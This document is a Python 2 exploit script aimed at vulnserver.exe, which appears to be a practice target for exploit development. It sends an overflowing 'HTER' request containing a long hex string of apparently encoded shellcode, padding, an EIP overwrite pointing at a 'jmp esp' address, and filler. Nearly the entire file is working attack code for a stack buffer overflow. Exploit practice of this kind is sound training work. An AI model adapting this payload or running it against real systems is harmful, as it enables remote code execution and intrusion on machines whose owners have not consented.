#!/usr/bin/python
import socket 
import os 
import sys
import struct

IP=sys.argv[1]
port=sys.argv[2]

   



payload = "HTER "
payload += ("0909090908BC480EC048BE089e0d9e5d970f45b53594949"
"494949494949494943434343434337515a6a415850304130"
"416b41415132414232424230424241425850384142754a49"
"696c68686c4263303770633051706b396d3570316f307064"
"4e6b763070304e6b7632544c6e6b727246746c4b53425578"
"344f4e57426a35763031596f4e4c774c7061316c7552346c"
"35706b71384f566d47714a674a424962636263676e6b6362"
"52304c4b537a774c6e6b704c723131685973304853316851"
"72714e6b3059575055516e334c4b737972384863565a6269"
"4c4b66546c4b7331494664714b4f6c6c5a61684f666d7771"
"695730384b50743558765553716d6b48556b734d44643255"
"4a4443684c4b7058313465514a7362464e6b544c526b6e6b"
"3368376c43314b636e6b34446c4b43314a704c4937343754"
"4464514b736b53515279527a42716b4f6970714f436f327a"
"4c4b37627a4b4e6d714d5538565370327770655062484437"
"42537472636f43643358426c6347313654476d596b58696f"
"4e304e584c5067714770677037594a643144563070685579"
"4f70306b63306b4f6855617a355a72483950793845514f71"
"524846624330323639396c49597636304630363032705150"
"36306730763032486a4a566f794f3970596f79455a37706a"
"46707146636730686e79693544343061596f59456d554950"
"5344555a796f304e666853456a4c6a485247733033307330"
"617a5550335a6774714666376248455268594f38514f596f"
"6b654f737a585330634e57464c4b3566324a637072486330"
"7670655077707366624a3770324846384e4476337975796f"
"5a756e737633524a73307636427332773358455278597848"
"614f396f59454d5349684550734d61387148624855505370"
"35505330335a455076303358566b346f466f34704b4f7855"
"714775383165706e526d50614b4f7945336e314e4b4f444c"
"7644566f4e657250796f696f6b4f68694d4b796f796f496f"
"56615a6371396956516569514f336d6b5a5068354e425056"
"524a57703633696f5a754141")
payload += "c"*(2041-len(payload)+5)
payload += "AF115062" # ------> EIP jmp esp
payload += "ffe0"
payload += "c"*(5000-len(payload))


print "[*] Sending evil HTER request to vulnserver.exe"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((IP, int(port)))
expl.send(payload)
expl.close()


# 1B115062